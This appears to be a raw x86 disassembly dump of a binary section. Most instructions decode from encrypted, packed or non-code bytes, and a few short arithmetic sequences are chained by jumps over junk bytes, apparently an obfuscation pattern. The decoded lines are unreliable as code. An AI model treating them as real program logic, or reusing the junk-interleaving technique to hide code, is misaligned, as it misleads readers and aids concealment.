  40d01b:	add    BYTE PTR [edi+ebp*4-0x1dfdf927],dh
  40d022:	div    DWORD PTR [edx-0x49ba4b94]
  40d028:	xchg   edx,eax
  40d029:	ja     0x40d000
  40d02b:	enter  0x1373,0x45
  40d02f:	(bad)  
  40d030:	push   ecx
  40d031:	pop    edi
  40d032:	push   esi
  40d033:	sahf   
  40d034:	jge    0x40d064
  40d036:	int    0xa8
  40d038:	jmp    0x8731:0x90c3ac12
  40d03f:	inc    esi
  40d040:	icebp  
  40d041:	sub    BYTE PTR [ebx-0x21],ch
  40d044:	xchg   BYTE PTR [eax+0x16],dh
  40d047:	mov    ebp,0x17c00850
  40d04c:	dec    ebx
  40d04d:	xchg   ebx,eax
  40d04e:	mov    edi,0xcca15201
  40d053:	outs   dx,BYTE PTR ds:[esi]
  40d054:	cmp    ebx,eax
  40d056:	test   BYTE PTR [ebx],cl
  40d058:	and    al,0xcb
  40d05a:	in     eax,dx
  40d05b:	cmp    dh,BYTE PTR [edi]
  40d05d:	push   cs
  40d05e:	ret    0x69bc
  40d061:	and    ebp,ecx
  40d063:	dec    ecx
  40d064:	xchg   esp,eax
  40d065:	dec    esi
  40d066:	mov    cl,0x96
  40d068:	or     BYTE PTR [edi-0x4b7dfb65],bh
  40d06e:	mov    ds:0xe51d51ce,eax
  40d073:	call   0xdb89:0x3d6c6bdc
  40d07a:	sub    edi,eax
  40d07c:	int3   
  40d07d:	inc    ebp
  40d07e:	xchg   esp,eax
  40d07f:	xchg   edx,eax
  40d080:	mov    ah,0x1b
  40d082:	pushf  
  40d083:	shr    DWORD PTR [edi+0x337d8238],0xb0
  40d08a:	ret    0x9723
  40d08d:	call   0xe799:0xf23854a4
  40d094:	sbb    eax,ecx
  40d096:	jbe    0x40d024
  40d098:	test   eax,0x30296704
  40d09d:	ins    DWORD PTR es:[edi],dx
  40d09e:	adc    BYTE PTR [edi-0x6c58ccfb],bh
  40d0a4:	fs stos BYTE PTR es:[edi],al
  40d0a6:	cmp    DWORD PTR [eax-0x6a0ba728],ecx
  40d0ac:	clc    
  40d0ad:	push   esp
  40d0ae:	xchg   ecx,eax
  40d0af:	xchg   BYTE PTR [di],dl
  40d0b2:	mov    ecx,?
  40d0b4:	in     eax,0x4e
  40d0b6:	sbb    bh,BYTE PTR [edi-0x30]
  40d0b9:	inc    eax
  40d0ba:	add    DWORD PTR [esi],ebp
  40d0bc:	out    0xe7,al
  40d0be:	xor    DWORD PTR [esi],esp
  40d0c0:	sar    dl,0x4b
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	out    dx,eax
  40d0ef:	repz dec eax
  40d0f1:	pop    esi
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d09a
  40d0fb:	pop    es
  40d0fc:	add    BYTE PTR [ebx+ebx*4-0x43],bl
  40d100:	or     BYTE PTR [esi+0xa633456],bl
  40d106:	das    
  40d107:	fld    DWORD PTR [ebp+0x32]
  40d10a:	sub    cl,BYTE PTR [ebp-0xa94bc97]
  40d110:	icebp  
  40d111:	cmp    ah,bh
  40d113:	or     bh,dl
  40d115:	xchg   DWORD PTR [edx-0x39ec5a9f],edx
  40d11b:	push   0xfffffff7
  40d11d:	push   eax
  40d11e:	push   cs
  40d11f:	sub    eax,DWORD PTR [edi+0x75]
  40d122:	jno    0x40d15f
  40d124:	inc    ebp
  40d125:	mov    bh,0x56
  40d127:	sub    DWORD PTR [ecx-0x5d],esi
  40d12a:	or     BYTE PTR [ebx+0x68a36d04],ah
  40d130:	shl    BYTE PTR [edx+0x2f8990b8],0x8
  40d137:	xlat   BYTE PTR ds:[ebx]
  40d138:	fwait
  40d139:	pop    ebx
  40d13a:	enter  0x7cdb,0xfb
  40d13e:	and    esp,DWORD PTR [edx-0x169c7eef]
  40d144:	rcl    DWORD PTR [eax-0x4c6aaac0],0xe2
  40d14b:	stos   DWORD PTR es:[edi],eax
  40d14c:	dec    esi
  40d14d:	sbb    BYTE PTR [ebx],0xa4
  40d150:	sar    ch,0x7f
  40d153:	std    
  40d154:	aas    
  40d155:	mov    edi,0x41e1d504
  40d15a:	sub    BYTE PTR [eax+0x1e4117bf],0xfd
  40d161:	push   ecx
  40d162:	push   edi
  40d163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d164:	test   BYTE PTR [eax+ecx*8+0x4e],bh
  40d168:	in     eax,dx
  40d169:	retf   
  40d16a:	in     al,0xd2
  40d16c:	test   BYTE PTR [edi+0x791198b0],bh
  40d172:	call   0x1a3a0d3f
  40d177:	pop    esp
  40d178:	bound  ebp,QWORD PTR [esi+ebx*1+0x1d]
  40d17c:	aad    0x7c
  40d17e:	std    
  40d17f:	cmp    esp,esp
  40d181:	cdq    
  40d182:	xchg   edi,eax
  40d183:	data16 mov dl,BYTE PTR [edx]
  40d186:	rcr    dh,cl
  40d188:	jns    0x40d1bd
  40d18a:	or     DWORD PTR [ebx+0x4e],edx
  40d18d:	sahf   
  40d18e:	mov    ebx,0x97ac6d6b
  40d193:	jbe    0x40d157
  40d195:	cmp    esp,DWORD PTR [edi]
  40d197:	stc    
  40d198:	dec    edx
  40d199:	push   0x9
  40d19b:	jae    0x40d17a
  40d19d:	xchg   edx,eax
  40d19e:	std    
  40d19f:	mul    BYTE PTR [ebp+0x25]
  40d1a2:	dec    edx
  40d1a3:	mov    ds:0xad76606d,al
  40d1a8:	jle    0x40d158
  40d1aa:	adc    ecx,0x295405e9
  40d1b0:	das    
  40d1b1:	dec    edi
  40d1b2:	jnp    0x40d138
  40d1b4:	out    0xf4,al
  40d1b6:	add    DWORD PTR [ebx+0x21],esp
  40d1b9:	hlt    
  40d1ba:	add    DWORD PTR [eax],edx
  40d1bc:	add    eax,0x3cf70685
  40d1c1:	add    ch,dl
  40d1c3:	mov    ebx,0x5d2f206a
  40d1c8:	push   esi
  40d1c9:	xchg   ch,al
  40d1cb:	aas    
  40d1cc:	scas   al,BYTE PTR es:[edi]
  40d1cd:	push   edi
  40d1ce:	sub    DWORD PTR [edi],ecx
  40d1d0:	add    edx,DWORD PTR [esi-0x7cf33925]
  40d1d6:	jb     0x40d1bf
  40d1d8:	sub    ah,BYTE PTR [ebp+0x14]
  40d1db:	jge    0x40d21b
  40d1dd:	jnp    0x40d173
  40d1df:	repnz mov ds:0x94842ab4,al
  40d1e5:	out    dx,al
  40d1e6:	daa    
  40d1e7:	cdq    
  40d1e8:	stc    
  40d1e9:	mov    ebx,0x631e54ad
  40d1ee:	outs   dx,BYTE PTR ds:[esi]
  40d1ef:	fadd   st(4),st
  40d1f1:	aas    
  40d1f2:	sub    eax,0x8fc742da
  40d1f7:	sub    BYTE PTR [eax],ah
  40d1f9:	(bad)  
  40d1fa:	mov    esp,0x12d9d64e
  40d1ff:	mov    ds:0x34ae29f0,al
  40d204:	or     ebx,DWORD PTR [ecx+0x37]
  40d207:	int    0x52
  40d209:	leave  
  40d20a:	push   ebx
  40d20b:	loopne 0x40d1e9
  40d20d:	and    edi,esp
  40d20f:	mov    BYTE PTR [edx-0x62d50a53],cl
  40d215:	enter  0x2c99,0x7e
  40d219:	fild   QWORD PTR [esi+0xdd1d095]
  40d21f:	or     BYTE PTR [ebx-0x51],bl
  40d222:	xor    DWORD PTR [ecx-0x2061efe3],esi
  40d228:	loope  0x40d268
  40d22a:	xchg   edx,eax
  40d22b:	out    dx,al
  40d22c:	ss (bad) 
  40d22f:	mov    ecx,0xad4fc0b5
  40d234:	sahf   
  40d235:	inc    edx
  40d236:	pushf  
  40d237:	(bad)  
  40d238:	ficom  WORD PTR [edi]
  40d23a:	add    DWORD PTR [ebx-0x12287080],0x46
  40d241:	inc    ebx
  40d242:	popa   
  40d243:	test   DWORD PTR [eax],0x5e5c22cd
  40d249:	std    
  40d24a:	leave  
  40d24b:	push   cs
  40d24c:	push   ecx
  40d24d:	xor    cl,BYTE PTR [ecx+0x11d426c6]
  40d253:	pop    edi
  40d254:	push   ss
  40d255:	mov    ebp,0x831becad
  40d25a:	outs   dx,BYTE PTR ds:[esi]
  40d25b:	shr    DWORD PTR [eax+0x7862269a],1
  40d261:	nop
  40d262:	pop    es
  40d263:	mov    ah,0xe8
  40d265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d266:	pushf  
  40d267:	scas   al,BYTE PTR es:[edi]
  40d268:	push   eax
  40d269:	stos   DWORD PTR es:[edi],eax
  40d26a:	pop    ds
  40d26b:	pop    ebp
  40d26c:	icebp  
  40d26d:	add    al,0xab
  40d26f:	mov    cl,0x8a
  40d271:	mov    esp,0x861610c6
  40d276:	dec    ebx
  40d277:	mov    ebx,DWORD PTR [ebx]
  40d279:	ret    
  40d27a:	add    ch,BYTE PTR [esi+0x49]
  40d27d:	and    edx,DWORD PTR [ebx]
  40d27f:	inc    esi
  40d280:	mov    esi,0x87bf20a4
  40d285:	pop    esp
  40d286:	push   ebp
  40d287:	inc    ecx
  40d288:	cli    
  40d289:	dec    ebx
  40d28a:	mov    eax,ds:0xb8a6b76b
  40d28f:	push   edi
  40d290:	xchg   ecx,eax
  40d291:	gs dec ebx
  40d293:	bound  ebx,QWORD PTR [edx-0x23a65979]
  40d299:	sbb    al,ch
  40d29b:	out    dx,eax
  40d29c:	xor    dl,BYTE PTR [eax-0x2]
  40d29f:	sub    al,0x66
  40d2a1:	cmc    
  40d2a2:	clc    
  40d2a3:	dec    esi
  40d2a4:	in     eax,0xe0
  40d2a6:	in     al,dx
  40d2a7:	add    eax,0x25bfcfb4
  40d2ac:	dec    esi
  40d2ad:	icebp  
  40d2ae:	cmp    BYTE PTR [esi],ah
  40d2b0:	cmp    bh,ah
  40d2b2:	sbb    dl,dh
  40d2b4:	push   esi
  40d2b5:	pop    ecx
  40d2b6:	xor    BYTE PTR [ecx],dl
  40d2b8:	or     edx,DWORD PTR [eax]
  40d2ba:	jecxz  0x40d300
  40d2bc:	and    DWORD PTR [esi],edi
  40d2be:	sub    al,0x5a
  40d2c0:	push   ebp
  40d2c1:	scas   eax,DWORD PTR es:[edi]
  40d2c2:	xor    al,BYTE PTR [ebx-0x1be6f411]
  40d2c8:	imul   ecx,DWORD PTR [edx+0x1db32c7f],0xffffff84
  40d2cf:	adc    al,0xbf
  40d2d1:	sti    
  40d2d2:	lahf   
  40d2d3:	sub    eax,0x80cb3efc
  40d2d8:	nop
  40d2d9:	cs ss jb 0x40d2e3
  40d2dd:	add    dh,0x37
  40d2e0:	dec    eax
  40d2e1:	loope  0x40d273
  40d2e3:	or     DWORD PTR [edi+0x7],ebp
  40d2e6:	cli    
  40d2e7:	int3   
  40d2e8:	test   edx,0x8dea98e9
  40d2ee:	jp     0x40d2f0
  40d2f0:	jl     0x40d2c8
  40d2f2:	ds pop edx
  40d2f4:	cmp    ebx,DWORD PTR [esp+edx*2+0x79]
  40d2f8:	add    ecx,DWORD PTR [edi]
  40d2fa:	jbe    0x40d31f
  40d2fc:	mov    ebx,esi
  40d2fe:	mov    esp,0x82dfdddc
  40d303:	sahf   
  40d304:	add    edx,DWORD PTR [edx-0x5f7a70ba]
  40d30a:	jge    0x40d351
  40d30c:	out    0x24,al
  40d30e:	adc    dh,BYTE PTR [ebx-0xa0fc56c]
  40d314:	push   0x3a1cd031
  40d319:	dec    ebp
  40d31a:	push   ebp
  40d31b:	inc    edx
  40d31c:	push   0x16ec2fac
  40d321:	fnstcw WORD PTR [edi]
  40d323:	push   es
  40d324:	add    edi,eax
  40d326:	xchg   ebx,eax
  40d327:	xchg   ecx,eax
  40d328:	xchg   ebp,eax
  40d329:	data16 fld QWORD PTR [ecx+0x26]
  40d32d:	imul   ecx,edx,0xffffffeb
  40d330:	push   ds
  40d331:	jns    0x40d35b
  40d333:	mov    ebp,0x138fdfc2
  40d338:	pop    ss
  40d339:	jbe    0x40d348
  40d33b:	out    dx,al
  40d33c:	cld    
  40d33d:	das    
  40d33e:	sub    ebx,DWORD PTR [ebx]
  40d340:	sbb    al,0x8
  40d342:	sub    cl,ah
  40d344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d345:	(bad)  ss:[ecx-0x7bcac22]
  40d34c:	cmp    eax,0xd7ece9b8
  40d351:	mov    ecx,0x581d33e4
  40d356:	dec    ebp
  40d357:	fstp   DWORD PTR [ecx]
  40d359:	repz or eax,0x5184a9d4
  40d35f:	leave  
  40d360:	push   0x16c000b8
  40d365:	jmp    0x6f17fe8d
  40d36a:	pop    ebp
  40d36b:	sbb    al,bl
  40d36d:	test   al,0x26
  40d36f:	pop    es
  40d370:	and    eax,0x8f21c2b5
  40d375:	dec    esp
  40d376:	jmp    0xe3cdcc2b
  40d37b:	in     al,0x85
  40d37d:	rcl    BYTE PTR [esi-0x19],0xdd
  40d381:	icebp  
  40d382:	sar    BYTE PTR [edi+0x37],0x85
  40d386:	retf   
  40d387:	mov    ds:0xca7fa27,al
  40d38c:	arpl   WORD PTR [esi+0x3e],bx
  40d38f:	test   al,0xf
  40d391:	xor    BYTE PTR [ecx],dl
  40d393:	iret   
  40d394:	stos   BYTE PTR es:[edi],al
  40d395:	ins    BYTE PTR es:[edi],dx
  40d396:	popa   
  40d397:	shl    DWORD PTR ds:0x3a6c1e24,0x2d
  40d39e:	pop    edi
  40d39f:	imul   ebp,DWORD PTR ds:0xde2ef03,0x23100182
  40d3a9:	dec    edi
  40d3aa:	lea    ecx,[edx-0x59]
  40d3ad:	out    0xf,al
  40d3af:	js     0x40d33a
  40d3b1:	popf   
  40d3b2:	sub    edx,DWORD PTR [edx-0x2a]
  40d3b5:	outs   dx,DWORD PTR ds:[esi]
  40d3b6:	xchg   ebx,eax
  40d3b7:	sbb    al,0x34
  40d3b9:	cs loop 0x40d39c
  40d3bc:	jl     0x40d355
  40d3be:	fldcw  WORD PTR [ebx-0x73c3718]
  40d3c4:	loopne 0x40d3cc
  40d3c6:	push   cs
  40d3c7:	inc    esi
  40d3c8:	dec    ebp
  40d3c9:	mov    WORD PTR [ebx],gs
  40d3cb:	call   0xb072c779
  40d3d0:	mov    edx,0xb9e74113
  40d3d5:	neg    DWORD PTR [eax]
  40d3d7:	fld    TBYTE PTR [edx+0x18]
  40d3da:	retf   
  40d3db:	imul   ecx,DWORD PTR [esi-0x76081f76],0x6d
  40d3e2:	or     al,0xbf
  40d3e4:	stc    
  40d3e5:	sbb    ecx,edi
  40d3e7:	fdiv   DWORD PTR [ebx-0x6bddd565]
  40d3ed:	loope  0x40d44e
  40d3ef:	loopne 0x40d422
  40d3f1:	cwde   
  40d3f2:	push   0xf97be1c9
  40d3f7:	cmp    ecx,ebx
  40d3f9:	mov    ds:0x72e2599b,eax
  40d3fe:	and    eax,0x97ffafe6
  40d403:	lea    ecx,[eax+0x3144b9c8]
  40d409:	mov    eax,0x53edc488
  40d40e:	or     ebx,DWORD PTR [ebp+0x660ba013]
  40d414:	in     eax,0x68
  40d416:	outs   dx,BYTE PTR ds:[esi]
  40d417:	pop    ss
  40d418:	xchg   esp,eax
  40d419:	clc    
  40d41a:	outs   dx,DWORD PTR ds:[esi]
  40d41b:	loope  0x40d3f0
  40d41d:	pop    ss
  40d41e:	int    0xad
  40d420:	lods   al,BYTE PTR ds:[esi]
  40d421:	add    dh,BYTE PTR [edx-0x515fabe8]
  40d427:	lea    eax,[esi-0x14]
  40d42a:	lods   eax,DWORD PTR ds:[esi]
  40d42b:	inc    ebp
  40d42c:	popf   
  40d42d:	loopne 0x40d3fe
  40d42f:	mov    ds:0xfc15e572,al
  40d434:	inc    eax
  40d435:	xor    esp,DWORD PTR [esi+0x6eea3f7f]
  40d43b:	cmp    esp,DWORD PTR [edx-0x2869227]
  40d441:	imul   ecx,DWORD PTR [esi],0xffffff83
  40d444:	jne    0x40d3e1
  40d446:	cli    
  40d447:	nop
  40d448:	add    BYTE PTR [eax+0x11f5f55f],0xcd
  40d44f:	push   cs
  40d450:	(bad)  [ecx+0xe]
  40d453:	add    bl,BYTE PTR [ebx+edx*1]
  40d456:	out    dx,al
  40d457:	call   0xc88c:0xe64c351d
  40d45e:	cli    
  40d45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d460:	mov    ebx,DWORD PTR [ebp-0x1b]
  40d463:	and    ebx,DWORD PTR [edi-0x563ec44b]
  40d469:	dec    ebp
  40d46a:	pop    esp
  40d46b:	mov    edi,0xc6aea0bd
  40d470:	jp     0x40d49c
  40d472:	and    DWORD PTR [esi+edx*8-0x3a],eax
  40d476:	cmc    
  40d477:	cli    
  40d478:	xor    eax,0x15438ae9
  40d47d:	je     0x40d463
  40d47f:	xchg   edi,eax
  40d480:	pop    ds
  40d481:	push   ds
  40d482:	adc    BYTE PTR [edi],ch
  40d484:	jo     0x40d4c7
  40d486:	aas    
  40d487:	xchg   edi,eax
  40d488:	add    al,0x46
  40d48a:	(bad)  
  40d48b:	adc    al,BYTE PTR [ebx-0x4a]
  40d48e:	mov    ss,WORD PTR [esi+0x21]
  40d491:	shl    BYTE PTR [edx+0x26],1
  40d494:	cmp    BYTE PTR [edi-0xd],bl
  40d497:	inc    ecx
  40d498:	and    cl,BYTE PTR [eax+0x46]
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xd0d3:0xb81a1d63
  40d4c6:	xchg   ebp,eax
  40d4c7:	mov    eax,0x7099c94d
  40d4cc:	jo     0x40d46d
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d462
  40d4d2:	pop    edx
  40d4d3:	cmp    dl,bh
  40d4d5:	jl     0x40d4d4
  40d4d7:	push   ecx
  40d4d8:	repz xchg ebp,ebx
  40d4db:	mov    edi,0x795ebf88
  40d4e0:	xchg   ebp,eax
  40d4e1:	xor    al,0xca
  40d4e3:	sbb    al,0x34
  40d4e5:	ja     0x40d4cd
  40d4e7:	dec    ebx
  40d4e8:	or     eax,0x5b914e74
  40d4ed:	dec    BYTE PTR [ebx+0xf]
  40d4f0:	inc    ebx
  40d4f1:	stos   BYTE PTR es:[edi],al
  40d4f2:	ret    0xc9dd
  40d4f5:	daa    
  40d4f6:	ds fcom st(7)
  40d4f9:	sub    dh,BYTE PTR [ebp-0x49]
  40d4fc:	jnp    0x40d533
  40d4fe:	push   0xa55c813f
  40d503:	loope  0x40d4d7
  40d505:	int    0x8d
  40d507:	mov    ecx,0xe81a0fb1
  40d50c:	adc    DWORD PTR ds:[esi],0xffffffc0
  40d510:	imul   esi,edi,0x1cf9d6e0
  40d516:	adc    DWORD PTR [esi],eax
  40d518:	cdq    
  40d519:	js     0x40d57c
  40d51b:	mov    ds:0x7dd0fc2e,al
  40d520:	test   al,0x86
  40d522:	stos   BYTE PTR es:[edi],al
  40d523:	jge    0x40d4b3
  40d525:	loop   0x40d583
  40d527:	retf   0x2889
  40d52a:	inc    eax
  40d52b:	or     ebx,edi
  40d52d:	jge    0x40d5ab
  40d52f:	fild   WORD PTR [edx]
  40d531:	push   eax
  40d532:	hlt    
  40d533:	mov    ah,0xd1
  40d535:	sbb    dh,bh
  40d537:	and    al,0xbd
  40d539:	(bad)
  40d53c:	mov    WORD PTR [eax+0x13],?
  40d53f:	xlat   BYTE PTR ds:[ebx]
  40d540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d542:	into   
  40d543:	sub    al,0x94
  40d545:	mov    WORD PTR [ebx+0x368e540d],si
  40d54c:	pushf  
  40d54d:	ins    DWORD PTR es:[edi],dx
  40d54e:	xchg   edx,eax
  40d54f:	(bad)  
  40d550:	cwde   
  40d551:	inc    ebx
  40d552:	and    al,0x94
  40d554:	ret    
  40d555:	mov    bh,0xee
  40d557:	lods   eax,DWORD PTR ds:[esi]
  40d558:	cmp    ah,ch
  40d55a:	dec    ebx
  40d55b:	sahf   
  40d55c:	imul   ebx,edi,0xcd5e0dad
  40d562:	jnp    0x40d59d
  40d564:	lods   al,BYTE PTR ds:[esi]
  40d565:	stos   BYTE PTR es:[edi],al
  40d566:	call   0xfcfbf091
  40d56b:	outs   dx,BYTE PTR ds:[esi]
  40d56c:	movlps xmm6,QWORD PTR [edx]
  40d56f:	jmp    0x763e3421
  40d574:	xor    BYTE PTR [edi+0x68],dl
  40d577:	in     eax,0xbe
  40d579:	inc    eax
  40d57a:	push   0x35766b2e
  40d57f:	dec    eax
  40d580:	(bad)  
  40d581:	fsubr  DWORD PTR [ecx+0x2794816f]
  40d587:	xchg   BYTE PTR [ebx+ecx*4+0x37],ah
  40d58b:	mov    eax,edi
  40d58d:	xchg   ebp,eax
  40d58e:	pop    ebp
  40d58f:	fwait
  40d590:	out    dx,eax
  40d591:	and    al,0x92
  40d593:	test   al,0x4d
  40d595:	push   si
  40d597:	jbe    0x40d528
  40d599:	dec    BYTE PTR [edx-0x1f]
  40d59c:	adc    ch,cl
  40d59e:	push   ss
  40d59f:	sahf   
  40d5a0:	adc    al,0x2b
  40d5a2:	mov    cl,0x6c
  40d5a4:	cmp    DWORD PTR [ebp-0x17],esp
  40d5a7:	ss sub al,0x1d
  40d5aa:	inc    ebx
  40d5ab:	mov    cl,0x61
  40d5ad:	push   es
  40d5ae:	mov    edx,0x8f212aa9
  40d5b3:	jne    0x40d5dd
  40d5b5:	or     DWORD PTR [edi-0x75],esp
  40d5b8:	and    eax,0xcdf5f46d
  40d5bd:	and    al,0xe2
  40d5bf:	fmulp  st(5),st
  40d5c1:	(bad)
  40d5c4:	adc    dh,BYTE PTR [ebx+0x1b]
  40d5c7:	mov    ch,ah
  40d5c9:	into   
  40d5ca:	ror    BYTE PTR [eax],0xc6
  40d5cd:	pop    edi
  40d5ce:	mov    ds:0xb5781494,al
  40d5d3:	dec    esi
  40d5d4:	add    al,BYTE PTR [ebx+0x2e536795]
  40d5da:	js     0x40d5ed
  40d5dc:	mov    WORD PTR [eax+eax*1-0x7a],sp
  40d5e1:	sbb    al,0xc5
  40d5e3:	or     ebp,DWORD PTR [eax]
  40d5e5:	push   edx
  40d5e6:	mov    ah,0xcc
  40d5e8:	jg     0x40d64f
  40d5ea:	stos   BYTE PTR es:[edi],al
  40d5eb:	sbb    dh,BYTE PTR [ecx+eax*2+0x59]
  40d5ef:	cmp    BYTE PTR [edi],ah
  40d5f1:	xor    eax,0xa0cdcb5c
  40d5f6:	jecxz  0x40d5bf
  40d5f8:	sbb    eax,0x1db78cb
  40d5fd:	dec    ecx
  40d5fe:	xchg   ebx,eax
  40d5ff:	xchg   ebx,eax
  40d600:	in     eax,0x1d
  40d602:	mov    bl,0x4f
  40d604:	push   edi
  40d605:	xchg   ecx,eax
  40d606:	(bad)
  40d609:	sub    eax,0xec2e1184
  40d60e:	pusha  
  40d60f:	mov    dh,0xa8
  40d611:	jmp    0x14be:0x72979616
  40d618:	cwde   
  40d619:	call   0xb9d0:0xf5ae98d5
  40d620:	xchg   edx,eax
  40d621:	ins    DWORD PTR es:[edi],dx
  40d622:	sbb    al,0xd9
  40d624:	mov    cl,0x90
  40d626:	and    al,0xd1
  40d628:	lea    ebx,[ebx-0x5]
  40d62b:	mov    ah,0x2b
  40d62d:	push   edi
  40d62e:	hlt    
  40d62f:	add    al,0x8e
  40d631:	lods   al,BYTE PTR ds:[esi]
  40d632:	lahf   
  40d633:	aaa    
  40d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d635:	add    bh,BYTE PTR [esi-0x7d327042]
  40d63b:	mov    dl,0x85
  40d63d:	imul   edx,DWORD PTR [edx-0x2e],0x272a8d44
  40d644:	ret    0x9bdc
  40d647:	cmp    al,0xe3
  40d649:	mov    esp,0x48e4220e
  40d64e:	push   ss
  40d64f:	(bad)  
  40d650:	push   0xffffffe6
  40d652:	je     0x40d66d
  40d654:	aam    0x1b
  40d656:	jge    0x40d60a
  40d658:	cmp    esi,edx
  40d65a:	pusha  
  40d65b:	inc    ebp
  40d65c:	stc    
  40d65d:	cdq    
  40d65e:	scas   eax,DWORD PTR es:[edi]
  40d65f:	xor    eax,0xd93a54c9
  40d664:	enter  0xf96b,0x1b
  40d668:	sbb    eax,0x46396d36
  40d66d:	mov    al,0x4e
  40d66f:	xchg   esp,eax
  40d670:	and    al,0xbe
  40d672:	and    DWORD PTR [edx-0x7f6c23e],ebp
  40d678:	imul   esp,DWORD PTR [eax+eiz*4],0x7d
  40d67c:	popf   
  40d67d:	dec    eax
  40d67e:	ret    0x6cc3
  40d681:	neg    BYTE PTR [ecx+0x7d]
  40d684:	adc    BYTE PTR [eax-0x6e],al
  40d687:	or     cl,BYTE PTR [edx]
  40d689:	repz dec esp
  40d68b:	jbe    0x40d686
  40d68d:	mov    al,0x83
  40d68f:	jg     0x40d697
  40d691:	dec    esi
  40d692:	(bad)  
  40d693:	adc    eax,ecx
  40d695:	lea    edx,[eax+0x4d]
  40d698:	test   edi,ecx
  40d69a:	sbb    BYTE PTR [edx-0x465c5e16],bh
  40d6a0:	rcr    cl,cl
  40d6a2:	pop    esi
  40d6a3:	outs   dx,DWORD PTR ds:[esi]
  40d6a4:	mov    ebp,0x4a40c82a
  40d6a9:	jb     0x40d700
  40d6ab:	aaa    
  40d6ac:	hlt    
  40d6ad:	cmp    DWORD PTR [edx+0x29],esp
  40d6b0:	lods   eax,DWORD PTR ds:[esi]
  40d6b1:	rol    DWORD PTR ds:0xaf3868ba,0x27
  40d6b8:	dec    edi
  40d6b9:	cmp    ch,ah
  40d6bb:	mov    ebx,0xe1d11f3b
  40d6c0:	lock add edi,DWORD PTR [ecx-0x72]
  40d6c4:	sub    DWORD PTR [eax-0x33],ecx
  40d6c7:	out    0x2,eax
  40d6c9:	stos   BYTE PTR es:[edi],al
  40d6ca:	cmp    BYTE PTR [eax],cl
  40d6cc:	sahf   
  40d6cd:	jp     0x40d6a4
  40d6cf:	mov    DWORD PTR [ecx-0x193ae0da],edi
  40d6d5:	fwait
  40d6d6:	jecxz  0x40d6e6
  40d6d8:	mov    bh,0x21
  40d6da:	retf   
  40d6db:	jnp    0x40d6af
  40d6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6de:	push   es
  40d6df:	or     al,0x30
  40d6e1:	push   eax
  40d6e2:	cmc    
  40d6e3:	retf   0x57fd
  40d6e6:	not    DWORD PTR [ebp-0x72]
  40d6e9:	or     BYTE PTR [edi+0x35],bl
  40d6ec:	retf   
  40d6ed:	fldenv [eax+eax*8]
  40d6f0:	pop    esp
  40d6f1:	xor    esp,DWORD PTR ds:0x9cc26514
  40d6f7:	push   es
  40d6f8:	sbb    eax,0x24241099
  40d6fd:	mov    ds:0xf70ce95b,al
  40d702:	inc    edx
  40d703:	icebp  
  40d704:	jnp    0x40d739
  40d706:	pop    ss
  40d707:	mov    cl,0xa5
  40d709:	mov    DWORD PTR [eax-0x6b47a9cb],eax
  40d70f:	cmp    eax,DWORD PTR [ebp-0x8]
  40d712:	inc    ebp
  40d713:	dec    edi
  40d714:	ds and al,0x42
  40d717:	mov    ds:0x4a036669,al
  40d71c:	aam    0xfd
  40d71e:	dec    eax
  40d71f:	daa    
  40d720:	jmp    0xda67:0x9ce1151f
  40d727:	and    edx,DWORD PTR [edx]
  40d729:	sbb    BYTE PTR [ecx-0x65],al
  40d72c:	xor    bl,bh
  40d72e:	mov    BYTE PTR [esp+edx*4+0x1f6d1d5a],cl
  40d735:	das    
  40d736:	mov    edi,0xcc0a2328
  40d73b:	inc    esp
  40d73c:	dec    esi
  40d73d:	sub    eax,0x695a375b
  40d742:	jb     0x40d71e
  40d744:	mov    ah,0x77
  40d746:	test   al,0x65
  40d748:	and    edx,edx
  40d74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d74b:	enter  0x1f69,0x47
  40d74f:	mov    esi,0x33fcb02c
  40d754:	(bad)  
  40d755:	ret    
  40d756:	call   0x3181:0x941a1b06
  40d75d:	iret   
  40d75e:	test   BYTE PTR [ebp+0x70c4fd1],0xea
  40d765:	les    ecx,FWORD PTR [ebp+0x7a]
  40d768:	pop    esp
  40d769:	mov    WORD PTR [edx+0x782f59ec],fs
  40d76f:	mov    dl,0x1a
  40d771:	xchg   DWORD PTR [edx-0x5b],ebp
  40d774:	test   eax,0x5e7004db
  40d779:	sbb    ecx,DWORD PTR [eax-0x50d1f807]
  40d77f:	xchg   ebx,eax
  40d780:	jg     0x40d75f
  40d782:	or     ah,dl
  40d784:	daa    
  40d785:	fimul  WORD PTR [edi+0x55]
  40d788:	adc    DWORD PTR [edi+ebp*2-0x65e5bb85],esp
  40d78f:	sbb    DWORD PTR [ecx-0x6d9538c5],0xffffffb8
